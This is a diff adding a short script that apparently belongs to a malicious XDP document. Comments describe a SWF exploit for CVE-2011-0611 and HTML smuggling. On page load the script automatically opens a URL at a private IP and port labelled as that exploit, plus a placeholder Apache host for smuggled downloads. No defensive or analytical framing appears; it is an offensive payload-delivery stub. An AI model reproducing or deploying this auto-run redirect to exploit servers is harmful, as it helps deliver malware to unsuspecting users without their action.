@@ -1,0 +1,14 @@
+<script>
+  //This XDP file contains a malicious XML Data Package (XDP) with a SWF exploit (CVE-2011-0611).
+  //It also includes functionality to download additional files via HTML-Smuggling by apache host.
+  
+  // Automatically open the URLs when the document is opened
+  window.onload = function() {
+    var url1 = 'http://192.168.1.8:8080/YM3N5Z'; // CVE-2011-0611
+    var url2 = 'http://your_apache_host'; // HTML Smuggling
+
+    // Open each URL in a new tab or window
+    window.open(url1, '_blank');
+    window.open(url2, '_blank');
+  };
+</script>
